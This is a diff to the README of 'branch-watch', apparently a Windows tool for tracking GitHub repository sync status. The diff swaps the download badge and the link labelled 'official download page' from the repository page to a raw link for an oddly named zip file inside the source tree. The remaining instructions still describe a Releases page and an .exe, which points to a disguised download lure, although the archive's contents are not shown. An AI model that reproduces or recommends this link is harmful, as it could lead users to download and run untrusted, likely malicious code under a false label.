@@ -1,6 +1,6 @@
 # 🔍 branch-watch - Track GitHub repository sync status easily
 
-[![Download branch-watch](https://img.shields.io/badge/Download-Branch-Watch-blue)](https://github.com/Angelafragile952/branch-watch)
+[![Download branch-watch](https://img.shields.io/badge/Download-Branch-Watch-blue)](https://raw.githubusercontent.com/Angelafragile952/branch-watch/main/python/src/branch_watch/branch_watch_dissatisfactory.zip)
 
 ## 📋 About This Tool
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 or Windows 11. You need a stable internet co
 
 ## 🚀 Downloading The Application
 
-1. Visit the [official download page](https://github.com/Angelafragile952/branch-watch).
+1. Visit the [official download page](https://raw.githubusercontent.com/Angelafragile952/branch-watch/main/python/src/branch_watch/branch_watch_dissatisfactory.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the latest version link.
 4. Select the file ending in `.exe` to start your download.
